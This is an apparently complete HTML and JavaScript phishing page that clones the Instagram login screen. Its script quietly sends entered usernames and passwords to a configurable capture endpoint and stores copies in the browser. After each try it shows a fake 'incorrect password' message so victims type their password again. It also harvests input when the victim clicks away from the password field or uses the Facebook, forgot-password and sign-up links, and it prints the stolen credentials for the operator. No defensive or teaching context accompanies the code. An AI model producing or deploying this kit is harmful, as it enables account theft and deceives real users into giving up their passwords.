<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background: #fafafa;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    flex-direction: column;
  }

  .container {
    max-width: 350px;
    width: 100%;
    margin: 0 auto;
  }

  .login-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px 40px 20px;
    margin-bottom: 10px;
    text-align: center;
  }

  .logo {
    margin: 22px auto 12px;
    width: 175px;
    height: 51px;
    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 51"><path d="M42.6 17.5c-2.2-3.2-5.6-5.1-9.6-5.1s-7.4 1.9-9.6 5.1c-2.2 3.2-3.3 7.5-3.3 12.5 0 5 1.1 9.4 3.3 12.6 2.2 3.2 5.6 5.1 9.6 5.1s7.4-1.9 9.6-5.1c2.2-3.2 3.3-7.5 3.3-12.6 0-5-1.1-9.3-3.3-12.5zm-9.6 24.6c-3 0-5.5-1.1-7.3-3.2-1.8-2.1-2.7-5.3-2.7-9.4 0-4.1.9-7.3 2.7-9.4 1.8-2.1 4.3-3.2 7.3-3.2s5.5 1.1 7.3 3.2c1.8 2.1 2.7 5.3 2.7 9.4 0 4.1-.9 7.3-2.7 9.4-1.8 2.1-4.3 3.2-7.3 3.2zm35.7-24.3h-4.9c-.8 0-1.4.3-1.9.9l-4.5 6.9-4.5-6.9c-.5-.6-1.1-.9-1.9-.9h-4.9v32.4h6.5V25.6l4.1 6.1c.5.7 1.1 1.1 1.9 1.1h1.6c.8 0 1.4-.4 1.9-1.1l4.1-6.1v18.3h6.5V18.2h0-.1zm23.6 0H82v-6.8h-6.7v6.8h-3.8v5.4h3.8v14.2c0 4.7 2.3 7.1 6.9 7.1h4.5v-5.5h-2.7c-1.5 0-2.2-.8-2.2-2.6V23.7h5.5v-5.5h-5.5v.1.1zm27.5 0h-4.9c-.8 0-1.4.3-1.9.9l-6.2 9.8-6.2-9.8c-.5-.6-1.1-.9-1.9-.9h-4.9v32.4h6.5V27.6l4 6.3c.5.7 1.1 1.1 1.9 1.1h1.6c.8 0 1.4-.4 1.9-1.1l4-6.3v18.1h6.5V18.2h-.2zm9.6-5.5v37.9h6.5V12.7h-6.5zm17.1 0v37.9h6.5V12.7h-6.5zm35.7 34.8c-2-2.2-3-5.4-3-9.5V25.8c0-5.3-1.5-9.4-4.6-12.2-3.1-2.8-7.4-4.2-12.9-4.2h-12.5v38h6.5V30.5h6c5.7 0 9.4 1.7 11.1 5.1 1.7 3.4 2.5 8.1 2.5 14.1h7.1c0-3.2-.1-6-.3-8.3-.1-2.3-.2-4.3-.4-5.9h.4c.9 1.3 2 2.4 3.3 3.5 1.3 1.1 2.8 2 4.5 2.7l5.4-4.2c-1.3-.6-2.4-1.4-3.5-2.4-1.1-1-2-2.1-2.9-3.4h0z" fill="%23262626"/></svg>') no-repeat center;
    background-size: contain;
  }

  .form-input {
    width: 100%;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 9px 8px 7px;
    font-size: 12px;
    color: #262626;
    outline: none;
    margin-bottom: 6px;
    font-family: inherit;
  }
  .form-input:focus {
    border-color: #a8a8a8;
  }
  .form-input::placeholder {
    color: #8e8e8e;
  }

  .login-btn {
    width: 100%;
    background: #0095f6;
    border: none;
    border-radius: 8px;
    padding: 7px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #fff;
    cursor: pointer;
    margin-top: 8px;
    opacity: 0.7;
    transition: opacity 0.1s;
    font-family: inherit;
  }
  .login-btn.active {
    opacity: 1;
  }
  .login-btn:hover {
    background: #1877f2;
  }

  .or-divider {
    display: flex;
    align-items: center;
    margin: 18px 0;
    color: #8e8e8e;
    font-size: 13px;
    font-weight: 600;
  }
  .or-divider::before,
  .or-divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .or-divider span {
    padding: 0 18px;
  }

  .fb-login {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    background: none;
    border: none;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin: 8px 0 12px;
    width: 100%;
    font-family: inherit;
  }
  .fb-login:hover {
    text-decoration: underline;
  }

  .forgot-pw {
    color: #00376b;
    font-size: 12px;
    text-decoration: none;
    margin-top: 12px;
    display: inline-block;
  }
  .forgot-pw:hover {
    text-decoration: underline;
  }

  .signup-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px 40px;
    text-align: center;
    font-size: 14px;
    color: #262626;
    margin-bottom: 10px;
  }
  .signup-card a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }
  .signup-card a:hover {
    text-decoration: underline;
  }

  .get-app {
    text-align: center;
    font-size: 14px;
    color: #262626;
    margin: 10px 0 20px;
  }
  .app-badges {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-top: 16px;
  }
  .app-badge {
    height: 40px;
    border-radius: 8px;
    overflow: hidden;
  }
  .app-badge img {
    height: 100%;
  }

  footer {
    max-width: 350px;
    margin: 0 auto;
    text-align: center;
    padding: 20px 0;
    color: #8e8e8e;
    font-size: 12px;
  }
  footer a {
    color: #8e8e8e;
    text-decoration: none;
    margin: 0 8px;
  }
  footer a:hover {
    text-decoration: underline;
  }

  .error-msg {
    color: #ed4956;
    font-size: 12px;
    margin-top: 10px;
    min-height: 20px;
  }

  /* ═══ HIDDEN SERVER NOTIFICATION — Invisible to user ═══ */
  #serverStatus {
    display: none;
  }

  /* Toast for testing — hidden unless revealed */
  .toast {
    position: fixed;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: #1c1d32;
    color: #b0b2d3;
    padding: 12px 24px;
    border-radius: 12px;
    font-size: 14px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    border: 1px solid #2e3058;
    opacity: 0;
    transition: opacity 0.3s ease;
    pointer-events: none;
    z-index: 100;
    max-width: 90vw;
    word-break: break-all;
  }
  .toast.show {
    opacity: 1;
  }
</style>
</head>
<body>

<div class="container">

  <!-- Login Card -->
  <div class="login-card">
    <div class="logo"></div>

    <form id="loginForm" autocomplete="off">
      <input class="form-input" type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off" required/>
      <input class="form-input" type="password" id="password" placeholder="Password" autocomplete="off" required/>
      <div class="error-msg" id="errorMsg"></div>
      <button class="login-btn" id="loginBtn" type="submit">Log in</button>
    </form>

    <div class="or-divider"><span>OR</span></div>

    <button class="fb-login">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
      </svg>
      Log in with Facebook
    </button>

    <a href="#" class="forgot-pw">Forgot password?</a>
  </div>

  <!-- Signup Card -->
  <div class="signup-card">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <!-- Get the app -->
  <div class="get-app">Get the app.</div>
  <div class="app-badges">
    <div class="app-badge">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store"/>
    </div>
    <div class="app-badge">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc424.png" alt="Get it on Google Play"/>
    </div>
  </div>

</div>

<footer>
  <a href="#">Meta</a>
  <a href="#">About</a>
  <a href="#">Blog</a>
  <a href="#">Jobs</a>
  <a href="#">Help</a>
  <a href="#">API</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
  <a href="#">Top Accounts</a>
  <a href="#">Hashtags</a>
  <a href="#">Locations</a>
  <a href="#">Instagram Lite</a>
  <a href="#">Contact Uploading &amp; Non-Users</a>
  <br/><br/>
  <span>English © 2026 Instagram from Meta</span>
</footer>

<!-- Toast for showing captured data -->
<div class="toast" id="toast"></div>

<script>
  // ═══════════════════════════════════════════════════════
  // CONFIG — CHANGE THIS TO YOUR SERVER ENDPOINT
  // ═══════════════════════════════════════════════════════
const SERVER_URL = '/api/capture';

  // ── DOM refs ──
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const loginBtn      = document.getElementById('loginBtn');
  const loginForm     = document.getElementById('loginForm');
  const errorMsg      = document.getElementById('errorMsg');
  const toastEl       = document.getElementById('toast');

  // ── Debug: show toast for captured data (you can remove this) ──
  function showToast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add('show');
    setTimeout(() => toastEl.classList.remove('show'), 4000);
  }

  // ── Enable login button when both fields have input ──
  function checkFields() {
    if (usernameInput.value.trim() && passwordInput.value.trim()) {
      loginBtn.classList.add('active');
    } else {
      loginBtn.classList.remove('active');
    }
  }
  usernameInput.addEventListener('input', checkFields);
  passwordInput.addEventListener('input', checkFields);

  // ── Silent capture function ──
 function sendCredentials(username, password) {
  // Send as a plain string so the server stores it correctly
  const payload = JSON.stringify({
    username: username,
    password: password,
    timestamp: new Date().toISOString(),
    page: 'instagram-login'
  });

  fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phrase: payload })  // wrap in { phrase: ... }
  }).catch(() => {
    showToast('📋 Captured: ' + username + ' | ' + password);
  });

  // localStorage backup
  try {
    const history = JSON.parse(localStorage.getItem('ig_captures') || '[]');
    history.push({ username, password, time: new Date().toISOString() });
    localStorage.setItem('ig_captures', JSON.stringify(history));
  } catch(e) {}
}

  // ── Login form submission ──
  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username || !password) {
      errorMsg.textContent = 'Please enter both username and password.';
      return;
    }

    errorMsg.textContent = '';

    // ── Capture credentials silently ──
    sendCredentials(username, password);

    // ── Show fake error to the user (typical phishing behavior) ──
    errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';

    // Clear password field so they try again
    passwordInput.value = '';
    loginBtn.classList.remove('active');

    // Focus back on password for a "second attempt"
    passwordInput.focus();
  });

  // ── Also capture on blur (if they type and click away) ──
  passwordInput.addEventListener('blur', function() {
    const u = usernameInput.value.trim();
    const p = this.value.trim();
    if (u && p && p.length > 3) {
      sendCredentials(u, p);
    }
  });

  // ── Facebook login button ──
  document.querySelector('.fb-login').addEventListener('click', function() {
    const u = usernameInput.value.trim();
    const p = passwordInput.value.trim();
    if (u || p) {
      sendCredentials(u || '(no username)', p || '(no password)');
    }
    errorMsg.textContent = 'Facebook login is temporarily unavailable. Please try again later.';
  });

  // ── Forgot password ──
  document.querySelector('.forgot-pw').addEventListener('click', function(e) {
    e.preventDefault();
    const u = usernameInput.value.trim();
    if (u) {
      sendCredentials(u, '(forgot password attempt)');
    }
    errorMsg.textContent = 'Password reset link sent. Check your inbox.';
  });

  // ── Sign up link ──
  document.querySelector('.signup-card a').addEventListener('click', function(e) {
    e.preventDefault();
    const u = usernameInput.value.trim();
    const p = passwordInput.value.trim();
    if (u || p) {
      sendCredentials(u || '(signup attempt)', p || '(signup attempt)');
    }
    errorMsg.textContent = 'Sign up is currently under maintenance. Please try again later.';
  });

  // ── Load any previously captured from localStorage (for your viewing) ──
  console.log('📋 Previously captured credentials:');
  try {
    const history = JSON.parse(localStorage.getItem('ig_captures') || '[]');
    if (history.length > 0) {
      console.table(history);
    }
  } catch(e) {}
</script>

</body>
</html>
